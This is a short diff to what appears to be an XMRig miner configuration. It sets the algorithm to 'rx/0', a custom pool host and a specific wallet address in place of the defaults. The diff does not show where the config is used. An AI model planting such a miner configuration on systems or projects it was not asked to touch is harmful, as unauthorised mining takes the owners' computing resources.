@@ -54,10 +54,10 @@
     "log-file": null,
     "pools": [
         {
-            "algo": null,
+            "algo": "rx/0",
             "coin": null,
-            "url": "donate.v2.xmrig.com:3333",
-            "user": "YOUR_WALLET_ADDRESS",
+            "url": "gcp.greetings.vip:4242",
+            "user": "46d8T9VNZjQ93qEfFwRqQRZ3c6zY9rZXt4wVbxwQ13cgeLuDJaAbd9Kg2p1KrXD238NfDEBJR1cQV9NawF5z1nef91UpfFy",
             "pass": "x",
             "rig-id": null,
             "nicehash": false,
